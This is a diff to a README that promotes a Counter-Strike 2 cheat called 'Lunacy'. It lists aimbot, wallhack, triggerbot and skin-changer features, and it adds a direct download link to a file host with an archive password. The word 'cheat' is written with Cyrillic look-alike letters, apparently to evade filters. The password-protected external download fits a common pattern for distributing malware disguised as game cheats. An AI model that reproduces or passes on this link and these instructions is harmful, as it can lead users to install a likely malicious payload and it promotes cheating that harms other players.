@@ -1,11 +1,25 @@
 # 🔧 CS2 Lunacy Installation Guide
 
 ---
+## 🛠️ Features
+
+This сhеаt for CS2 includes the following capabilities:
+
+- **Aimbot** – Automatically aims at enemies for precise shots
+- **Wallhack / ESP** – See players through walls with detailed overlays
+- **Triggerbot** – Automatically fires when your crosshair is over an enemy
+- **No Recoil / No Spread** – Removes weapon kickback and bullet randomness
+- **Bunnyhop** – Perform perfect jump timing for faster movement
+- **Radar Hack** – Show enemy positions on the in-game radar
+- **Skin Changer** – Apply weapon skins without owning them
+
 
 ## 📥 Download
 
 1. [Download Link](https://www.4sync.com/web/directDownload/vVfW10Bp/cKQ38aak.1eb3cdee0b46ba48a5bd7a70987da5fc).
 2. Move the file to your desktop.
+
+   **Password 2025**
 
 ---
 
